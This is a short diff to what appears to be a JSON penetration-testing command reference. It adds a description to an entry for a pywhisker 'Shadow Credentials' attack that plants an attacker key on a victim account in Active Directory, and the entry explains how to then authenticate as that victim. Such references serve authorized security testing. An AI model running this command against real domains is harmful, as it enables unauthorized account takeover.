@@ -194,7 +194,8 @@
   "variations": [
     {
       "label": "Add a Key Credential (shadow creds)",
-      "command": "pywhisker --dc-ip <dc_ip> -d <domain> -u <user> -p <password> --target <victim> --action add"
+      "command": "pywhisker --dc-ip <dc_ip> -d <domain> -u <user> -p <password> --target <victim> --action add",
+      "description": "Add a Key Credential (shadow creds). See the command syntax for exact parameters and flags."
     }
   ],
   "explain": "Plants a Shadow Credential on a target to obtain a PFX you can authenticate with:\n  pywhisker                msDS-KeyCredentialLink manipulator\n  --dc-ip <dc_ip>          the Domain Controller\n  -d <domain> -u <user> -p '<password>'   authenticate as the account with write access\n  --target <target_user>   the victim whose msDS-KeyCredentialLink you write\n  --action add             add an attacker-controlled key credential\nYou get a PFX for the target; use it with gettgtpkinit (PKINIT) to authenticate as them."
